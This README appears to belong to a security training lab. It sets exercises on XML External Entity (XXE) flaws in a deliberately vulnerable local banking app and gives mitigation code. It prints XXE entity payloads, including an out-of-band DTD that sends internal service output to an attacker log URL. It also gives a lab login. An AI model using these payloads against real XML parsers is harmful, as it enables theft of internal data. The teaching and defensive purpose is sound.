# Exercise 5 - XML External Entities (XXE) 
Exercise to help you understand XEE exploits and their mitigations

## Setup and Start Applications
1. check out exercise2 
   * choose branch 'exercise2' in the 'VCS -> Git -> Branches' menu within IntelliJ
1. start the v-bank-app in debug mode
   * start the Maven configuration for the "v-bank-app" in DEBUG mode (with the green BUG icon next to the arrow)
   (you should have created it as described in point __2.2. of the Workspace Setup Instructions__ at https://github.com/vargadan/v-bank/blob/master/README.md)
1. start the attacker-app
   * start the Maven configuration for the "v-bank-app" in DEBUG mode (with the green BUG icon next to the arrow)
   (you should have created it as described in point __2.2. of the Workspace Setup Instructions__ at https://github.com/vargadan/v-bank/blob/master/README.md)
   
## Brief description of the exercise
The applications in this scenario are:
* the v-bank application at http://vbank.127.0.0.1.xip.io:8080 
* the attacker application at http://attack.127.0.0.1.xip.io:9090/xxe, this holds the (malicaiout) XML payloads and DTDs
  * For the standard XXE scenario:
    * The XML payload: http://attack.127.0.0.1.xip.io:9090/xml/xxe_standard.xml 
  * For the out-of-band XXE scenario
    * The XML payload: http://attack.127.0.0.1.xip.io:9090/xml/xxe_out-of-band.xml
    * And the DTD: http://attack.127.0.0.1.xip.io:9090/xml/evil.dtd
* The victim service at: http://service.127.0.0.1.xip.io:9090/victim  
    * This service should normally not be available to the client calling the v-bank application. 
    * The response of this service is the confidential data the attacker steals or leaks by exploiting the XXE vulnerability.
    With the help of the XXE exploit the attacker manages to call the service and
      * Standard XXE: Place the victim's output in the processed document and put in the note of resulting transaction.
      * Out-of-band XXE: Send the victim's output to the logger service at http://attack.127.0.0.1.xip.io:9090/log (you can see what has been logged at http://attack.127.0.0.1.xip.io:9090/viewlog)
\
But first you have to find the XXE vulnerability in the v-bank-app.

## Look for XXE vulnerabilities

### Hint 
XXE vulnerabilities are to be found where XML parsing/processing takes place.

### Present vulnerability 
_BankController.uploadTransactions(...)_ where the processing of the uploaded XML from the home page takes place.

## Exploit to understand

For the exploit we will use the XML files downloadable from http://attack.127.0.0.1.xip.io:9090/xxe 
Please download the beolow files to a folder on your local drive:
* transactions.xml: The normal payload creating 2 transactions;
* xxe_call_service.xml: the XXE payload calling the victim service and parsing its response/output into the note field of the transaction;
* xxe_call_service_out-of-band.xml: XXE payload also calling the victim service whose response/output it sends to the attacker's log service.  

1. Test
   * Login as bob (bob / h3ll0bob) and upload transactions.xml. 
   * You should see 2 transactions in the transaction history page.

1. Standard XXE
   * Logged in as bob, please upload xxe_standard.xml
   * 1 new transaction should appear in the history screen: 
     * In the note file of the newly uploaded transaction you should see "...(you fall victim to a standard XXE attack!)"
   * What was happening?
     * ```<!ENTITY victim SYSTEM 'http://service.127.0.0.1.xip.io:9090/victim'>``` entry created a victim entity with the output of the _victim_ _service_ as its value. When processing the XML the _&victim_ entity reference actually behaves as a constant initialized with the output or response of the system resource at _http://service.127.0.0.1.xip.io:9090/victim_. 
     * Then because of the ```<note>&victim;</note>``` the XML parser places it into the the note field. When the XML processor finally creates the object of class _Transaction_ its _note_ property will be set accordingly.
    
1. Out-of-Band XXE    
   * Logged in as bob, please upload xxe_out-of-band.xml
   * 1 new transaction should appear in the history screen: 
     * In the note file of the newly uploaded transaction you should see "...(you fall victim to a Out-of-Band XXE attack!)"
   * What was happening?
     * ```<!ENTITY victim SYSTEM 'http://service.127.0.0.1.xip.io:9090/victim'>``` entry created a victim entity with the outout of the _victim_ _service_ as its value
     * Then in the_evil.dtd used the %victim; parameter entity (parameter entities are denoted by % and can be reused within the DTD) to create another %send; entity which when evaluated will send the value of %victim; to the log service at http://attack.127.0.0.1.xip.io:9090/log 
     ```<?xml version="1.0" encoding="UTF-8"?>
            <!ENTITY % all "<!ENTITY send SYSTEM 'http://attack.127.0.0.1.xip.io:9090/log?msg=%victim;'>">
            %all;
     ```
     * Because the output of the attacked service (normally confidential information) is send to the log service and is not received with the response it is called Out-of-Band XXE. 
       (It is also called Blind XXE) 
       
 1. Tasks 
    * (1) Configure the XML parser to omit external DTD resources; so that it cannot load the evil.dtd 
    * (2) Add a lexical parser to preprocess the XML and fail if any entities are found
    * Hints:
      * (1) in _BankController.uploadTransactions(...)_:
       ```
       unmarshaller.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "false");
       ```
      * (2) create a new class: 
       ```
       public class AntiEntityScanner {
       
           private static final String LEXICAL_HANDLER = "http://xml.org/sax/properties/lexical-handler";
       
           public static void check(final InputStream data) throws Exception {
               final SAXParser saxParser = SAXParserFactory.newInstance().newSAXParser();
               final ElementHandler handler = new ElementHandler();
               saxParser.getXMLReader().setProperty(LEXICAL_HANDLER, handler);
               saxParser.parse(data, handler);
           }
       
           public static final class ElementHandler extends org.xml.sax.ext.DefaultHandler2 {
               @Override
               public void startEntity(final String name) throws SAXException {
                   throw new IllegalArgumentException("Entities are illegal");
               }
           }
       }
       ```
     * (2) and in _BankController.uploadTransactions(...)_:
       ```
       InputStream incomingXML = file.getInputStream();
       //scan for entities in incoming XML without parsing the content
       AntiEntityScanner.check(incomingXML);
       ```
The solution is avaliable in the exercise5-solution branch at https://github.com/vargadan/v-bank/tree/exercise5-solution
You may find more on XXE mitifations at https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md
